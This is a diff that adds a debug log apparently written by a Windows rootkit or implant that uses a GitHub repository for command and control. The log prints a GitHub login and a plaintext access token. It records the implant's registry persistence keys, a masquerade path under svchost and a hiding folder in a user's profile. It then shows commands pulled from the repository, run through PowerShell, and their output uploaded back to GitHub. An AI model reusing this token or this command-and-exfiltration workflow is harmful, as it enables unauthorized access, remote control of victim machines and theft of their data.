@@ -1,0 +1,64 @@
+Mon Aug 23 01:26:55 2021. Initialisation of the log file.
+
+DEBUG: Mon Aug 23 01:26:55 2021: GithubLogin: hidemepls785
+DEBUG: Mon Aug 23 01:26:55 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Mon Aug 23 01:26:55 2021: GihubAccessToken: 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
+DEBUG: Mon Aug 23 01:26:55 2021: Rootkit Name: CorepPreprod2
+DEBUG: Mon Aug 23 01:26:55 2021: Rootkit Registry Key: Sensors
+DEBUG: Mon Aug 23 01:26:55 2021: Run Registry Key Name: test
+DEBUG: Mon Aug 23 01:26:55 2021: Adding the actual location of the servant: C:\Windows\SysWOW64\svchost.exe
+DEBUG: Mon Aug 23 01:26:55 2021: The folder list for random folder is not empty. Its size is: 4000
+DEBUG: Mon Aug 23 01:26:55 2021: The random path choosed for this execution is: C:\Users\sophie\AppData\Local\Packages\NcsiUwpApp_8wekyb3d8bbwe\AC\INetCookies
+DEBUG: Mon Aug 23 01:26:55 2021: Start of a new loop to get commands and treat them.
+DEBUG: Mon Aug 23 01:26:55 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Mon Aug 23 01:26:56 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Mon Aug 23 01:26:56 2021: Success to check the commands with rootkit_path1
+DEBUG: Mon Aug 23 01:26:56 2021: Getting this command from the github repo: stay_alive
+DEBUG: Mon Aug 23 01:26:56 2021: Getting this command from the github repo: execute_cmd Reg Query HKEY_CURRENT_USER\SOFTWARE\Microsoft\Input
+DEBUG: Mon Aug 23 01:26:56 2021: Start to treat the commands sent by the github repo.
+DEBUG: Mon Aug 23 01:26:56 2021: The command stay_alive has been receive, the rootkit will not stop its execution.
+DEBUG: Mon Aug 23 01:26:56 2021: Command received: stay_alive
+DEBUG: Mon Aug 23 01:26:56 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Mon Aug 23 01:26:56 2021: #####################################################
+
+DEBUG: Mon Aug 23 01:26:56 2021: The command stay_alive has been receive, the rootkit will not stop its execution.
+DEBUG: Mon Aug 23 01:26:56 2021: Command received: execute_cmd
+DEBUG: Mon Aug 23 01:26:56 2021: The following command will be executed by powershell: Reg Query HKEY_CURRENT_USER\SOFTWARE\Microsoft\Input > C:\Users\sophie\AppData\Local\Packages\NcsiUwpApp_8wekyb3d8bbwe\AC\INetCookies\target_command1.log
+DEBUG: Mon Aug 23 01:26:58 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\NcsiUwpApp_8wekyb3d8bbwe\AC\INetCookies\target_command1.log
+DEBUG: Mon Aug 23 01:26:58 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Mon Aug 23 01:27:00 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\NcsiUwpApp_8wekyb3d8bbwe\AC\INetCookies\target_command1.log
+DEBUG: Mon Aug 23 01:27:00 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Mon Aug 23 01:27:02 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\NcsiUwpApp_8wekyb3d8bbwe\AC\INetCookies\target_command1.log
+DEBUG: Mon Aug 23 01:27:02 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Mon Aug 23 01:27:04 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\NcsiUwpApp_8wekyb3d8bbwe\AC\INetCookies\target_command1.log
+DEBUG: Mon Aug 23 01:27:04 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Mon Aug 23 01:27:06 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\NcsiUwpApp_8wekyb3d8bbwe\AC\INetCookies\target_command1.log
+DEBUG: Mon Aug 23 01:27:06 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Mon Aug 23 01:27:08 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\NcsiUwpApp_8wekyb3d8bbwe\AC\INetCookies\target_command1.log
+DEBUG: Mon Aug 23 01:27:08 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Mon Aug 23 01:27:10 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\NcsiUwpApp_8wekyb3d8bbwe\AC\INetCookies\target_command1.log
+DEBUG: Mon Aug 23 01:27:10 2021: The file that will be read weight: 1684130
+DEBUG: Mon Aug 23 01:27:10 2021: Success to read the binary file. This number of bytes have been read: 1684131
+DEBUG: Mon Aug 23 01:27:10 2021: Success to delete the temporary file that store the powershell output
+DEBUG: Mon Aug 23 01:27:10 2021: Start of the method writeFileWindowsApi.
+DEBUG: Mon Aug 23 01:27:10 2021: The content size that will be written: 1684131
+DEBUG: Mon Aug 23 01:27:10 2021: Success to write the content(number of bytes : 1684131) in the file : C:\Users\sophie\AppData\Local\Packages\NcsiUwpApp_8wekyb3d8bbwe\AC\INetCookies\target_command1.log
+DEBUG: Mon Aug 23 01:27:10 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Mon Aug 23 01:27:10 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Mon Aug 23 01:27:10 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\NcsiUwpApp_8wekyb3d8bbwe\AC\INetCookies\target_command1.log
+DEBUG: Mon Aug 23 01:27:10 2021: The file that will be read weight: 1684131
+DEBUG: Mon Aug 23 01:27:10 2021: Success to read the binary file. This number of bytes have been read: 1684132
+DEBUG: Mon Aug 23 01:27:18 2021: The files C:\Users\sophie\AppData\Local\Packages\NcsiUwpApp_8wekyb3d8bbwe\AC\INetCookies\target_command1.log has been uploaded successfully in the github repo
+DEBUG: Mon Aug 23 01:27:18 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Mon Aug 23 01:27:18 2021: #####################################################
+
+DEBUG: Mon Aug 23 01:27:18 2021: Start of GithubCommunication::sendResults
+DEBUG: Mon Aug 23 01:27:19 2021: The place of the rootkit has not been found on the json
+DEBUG: Tue Aug 24 22:18:43 2021: Start of a new loop to get commands and treat them.
+DEBUG: Tue Aug 24 22:18:43 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Tue Aug 24 22:18:43 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Tue Aug 24 22:18:43 2021: Success to check the commands with rootkit_path1
+DEBUG: Tue Aug 24 22:18:43 2021: No commands are given in the github repo.
+DEBUG: Tue Aug 24 22:18:43 2021: The receive method and the method to send the results return true, breaking the Servant Mission loop.
+DEBUG: Tue Aug 24 22:18:43 2021: This is the end of servant mission.
+DEBUG: Tue Aug 24 22:18:43 2021: Start of GithubCommunication::sendLogs
